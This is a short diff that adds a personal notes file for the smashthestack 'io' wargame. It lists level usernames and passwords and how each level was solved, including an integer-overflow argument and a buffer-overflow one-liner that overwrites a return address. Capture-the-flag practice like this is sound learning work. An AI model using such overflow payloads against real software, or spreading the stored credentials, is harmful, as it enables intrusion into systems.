@@ -1,0 +1,15 @@
+http://io.smashthestack.org:84
+
+
+| Username | Password         | How Solved?                                                             |
+|----------+------------------+-------------------------------------------------------------------------|
+| level1   | level1           | Disassembled level01 to get the magic number in the cmp statement (271) |
+| level2   | 3ywr07ZFw5IsdKzU | /levels/level02 -2147483648 -1                                          |
+| level3   | IFd92yzOnSMv9tkX | /levels/level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')                                                                        |
+| level4   | nSwmULj2LpDnRGU2 |                                                                         |
+|          |                  |                                                                         |
+
+
+
+
+0x08048474
